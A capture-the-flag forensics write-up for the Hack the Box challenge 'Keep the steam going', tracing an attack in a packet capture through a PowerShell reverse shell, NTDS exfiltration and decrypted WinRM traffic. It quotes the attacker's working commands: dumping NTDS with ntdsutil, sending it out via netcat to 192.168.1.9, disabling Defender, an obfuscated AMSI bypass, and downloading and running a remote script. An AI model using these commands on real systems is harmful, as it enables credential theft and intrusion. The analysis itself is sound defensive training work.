---
title: "HTB • Keep the steam going"
tags:
  - "Forensics"
  - "Hard Difficulty"
  - "Advanced"
  - "Windows"
  - "Deobfuscation"
  - "WinRM"
  - "Blue Team"
  - "Packet Capture"
  - "Malware Analysis"
  - "PowerShell"
excerpt: "Keep the steam going is a hard forensics challenge on Hack the Box that involves the inspection of a packet capture to pinpoint malicious traffic. Along the way we deobfuscate a powershell script, recover NTDS secrets, and decrypt WinRM traffic."
categories:
  - "Writeups"
  - "Hack the Box Challenges"
img_path: "/assets/img/post/htb-challenges-keep-the-steam-going/"
---

_Keep the steam going_ is a hard forensics challenge created by [**thewildspirit**](https://app.hackthebox.com/users/70891) on [**Hack the Box**](https://app.hackthebox.com/challenges/279) that involves the inspection of a packet capture to pinpoint malicious traffic. Along the way we deobfuscate a powershell script, recover NTDS secrets, and decrypt WinRM traffic.

> The network in which our main source of steam is connected to, got compromised. If they managed to gain full control of this network, it would be a disaster!

## Initial Capture Analysis

We'll first open the capture file in [Wireshark](https://www.wireshark.org/) and filter by HTTP traffic. We immediately find a request to `http://192.168.1.9/rev.ps1`{:.filepath}. 

![Obfuscated shell](rev.png)
_We find a powershell script being served over HTTP_

Although the script is obfuscated using several different methods, parts of it are readable. We suspect this is a reverse shell script though because of the general length as well as the descriptive variable names such as _stream_, _sendback_, and _client_.

## Reverse Shell

As we manually deobfuscate some of the content from that powershell script, we discover that the script connects back to **192.168.1.9** on port **4443**. Let's check the packet capture for TCP traffic over this port.

![Reverse shell session](shell.png)
_We inspect the plaintext reverse shell session_

The adversary sends a series of commands to seemingly exfiltrate the NTDS database along with the SYSTEM registry hive. This is presumably done in order to extract authentication secrets offline and establish persistence.

>
```powershell
whoami;hostname
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
iex (New-Object System.Net.WebClient).DownloadFile("http://192.168.1.9/n.exe","C:\Users\Public\Music\n.exe")
certutil -encode "C:\temp\Active Directory\ntds.dit" "C:\temp\ntds.b64"
certutil -encode "C:\temp\REGISTRY\SYSTEM" "C:\temp\system.b64"
cat C:\temp\ntds.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
cat C:\temp\system.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080
```
{:.nolineno}

The adversary uses `certutil.exe`{:.filepath} to encode the files, then `n.exe`{:.filepath} (probably netcat), to transport the files over TCP port **8080**.

## Exfiltration

Let's check for traffic over port 8080 in our capture file in order to extract `ntds.b64`{:.filepath} and `system.b64`{:.filepath}.

![Exfiltration traffic](exfil.png)
_The adversary encodes & downloads some goodies_

TCP Streams 23 and 24 should be `ntds.b64`{:.filepath} and `system.b64`{:.filepath} respectively. with this in mind let's export both streams then decode the contents.

```bash
for n in ntds system; do grep -v '-' $n.b64 | base64 -d > $n; done
file ntds system # make sure they are properly formatted
```
{:.nolineno}

Now that the recovered files are in the correct format, we follow the tracks by using `secretsdump.py`{:.filepath} from [impacket](https://github.com/fortra/impacket) to extract some secrets we could potentially use to decrypt certain communications in the capture file.

```bash
mkdir secrets
secretsdump.py local -history -ntds ./ntds -system ./system -outputfile ./secrets/export
```
{:.nolineno}

We can now access the extracted secrets in `./secrets/`{:.filepath} if we need to.

## WinRM

Back at the packet capture, we filter out the traffic sent before the exfiltration over port 8080 using the filter `frame.number > 21346`. This will allow us to better see what actions the adversary took after stealing the NTDS secrets.

![Traffic after exfiltration](post-exfil.png)
_Looking for actions taken by the adversary after reading the NTDS secrets_

It looks like the attacker then used the NT hash for the user **Administrator** to connect to the machine via WinRM. The request body in each post-authentication request seems to be encrypted and labeled "**application/http-spnego-session-encrypted**". After some research into encrypted WinRM exchanges, we come across [this gist](https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045) created by [Jordan Borean](https://github.com/jborean93).

### Decryption

using [the python script](https://gist.github.com/jborean93/d6ff5e87f8a9f5cb215cd49826523045) mentioned earlier, we are able to decrypt the WinRM traffic using the NT hash for the user _Administrator_.

```bash
python3 winrm_decrypt.py -n "8bb1f8635e5708eb95aedf142054fc95" capture.pcap > decrypted.txt
```
{:.nolineno}

Now `decrypted.txt`{:.filepath} contains a bunch of XML that we filter through using some GNU utilities.

```bash
grep -Ei 'command|argument' decrypted.txt # Found tags rsp:Command, rsp:Arguments
grep -i '<rsp:Arguments>' decrypted.txt |
  sed -E 's/.*>(.*)<.*/\1/g' |
  base64 -d > arguments.bin # Save arguments
```
{:.nolineno}

Looking at the `arguments.bin`{:.filepath} file, there seems to be powershell code within the `<S N="V">` tags. Every other command is `(get-location).path`, which is probably not manually run by the adversary but rather a product of their WinRM shell.

```bash
strings arguments.bin |
  grep -i '<S N="V">' |
  sed 's/^\s*<S N="V">//' |
  grep -v '^(get-location).path$'
```
{:.nolineno}

>
```powershell
whoami;hostname
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
echo "[REDACTED]"
iex (new-object net.webclient).downloadstring('http://192.168.1.9/drop.ps1')
```
{:file="input.ps1"}

It seems that the adversary disables Windows defender, bypasses AMSI, and executes a remote powershell script in memory. In between the last two commands, we can also find the flag.
